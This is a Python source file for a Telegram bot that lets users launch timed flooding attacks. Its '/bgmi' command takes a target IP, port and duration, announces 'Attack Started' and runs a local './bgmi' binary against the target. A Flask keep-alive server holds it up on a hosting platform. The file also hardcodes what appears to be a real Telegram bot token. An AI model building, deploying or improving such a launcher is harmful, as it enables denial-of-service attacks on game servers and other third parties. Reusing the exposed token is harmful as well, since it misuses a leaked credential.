import telebot
import subprocess
import datetime
import os
from flask import Flask
from threading import Thread

# --- RENDER PORT BINDING FIX START ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is Active!"

def run():
    # Render automatically sets a PORT env variable
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.daemon = True
    t.start()
# --- RENDER PORT BINDING FIX END ---

# Insert your Telegram bot token here
bot = telebot.TeleBot('8729385483:AAG4cGOGrzJYrNseSXEPp5NBGpT8t0ZYt9I')

# Configuration
LOG_FILE = "bot_logs.txt"
bgmi_cooldown = {}

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if time: log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = f"🚀 {username}, Attack Started!\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds"
    bot.reply_to(message, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 300:
        bot.reply_to(message, "⏳ You are on cooldown. Please wait 5 minutes.")
        return

    command = message.text.split()
    if len(command) == 4:
        try:
            target, port, time = command[1], command[2], int(command[3])
            if time > 300:
                bot.reply_to(message, "❌ Error: Maximum time is 300 seconds.")
                return

            bgmi_cooldown[user_id] = datetime.datetime.now()
            record_command_logs(user_id, '/bgmi', target, port, time)
            start_attack_reply(message, target, port, time)

            # Executing the binary
            subprocess.run(["./bgmi", target, port, str(time), "300"])
            bot.reply_to(message, f"✅ Attack Finished on {target}")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")

@bot.message_handler(commands=['id', 'help', 'start'])
def basic_commands(message):
    bot.reply_to(message, "Bot is running! Use /help for commands.")

if __name__ == "__main__":
    print("Starting Flask web server...")
    keep_alive()  # This solves the 'No open ports' error
    print("Bot is polling...")
    bot.polling(none_stop=True)
    
